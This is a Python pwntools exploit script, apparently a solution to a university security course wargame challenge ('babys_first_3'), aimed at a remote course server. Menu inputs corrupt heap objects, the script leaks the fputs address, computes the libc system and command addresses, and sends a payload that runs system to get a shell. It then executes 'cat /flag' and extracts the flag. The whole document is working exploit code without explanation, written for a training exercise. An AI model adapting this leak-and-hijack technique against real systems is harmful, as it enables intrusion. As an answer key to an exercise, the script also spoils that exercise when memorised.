#!/usr/bin/python

from pwn import *
import re

#c = process("./babys_first_3")
c = remote("wargames.6447.sec.edu.au", 9003)
#gdb.attach(c)

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("aaaa")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("bbbb")

c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("cccc")

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("3")

reply = c.recvuntil('>')
fputs = u32(reply[9:13])
system = fputs-0x23d40
#system = fputs-0x29370
log.info("Fputs at %s" % (hex(fputs)))

command = fputs+0x1008af

c.sendline("2")
c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")

c.recvuntil('>')
payload = "a"*8
payload += p32(system)
payload += p32(command)
c.send(payload)

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("1")

time.sleep(1)
c.sendline("cat /flag")
reply = c.recvuntil('}')
flag = re.search("6447{(.*)}", reply).group(0)

log.success("Flag found: %s" % (flag))

c.close()
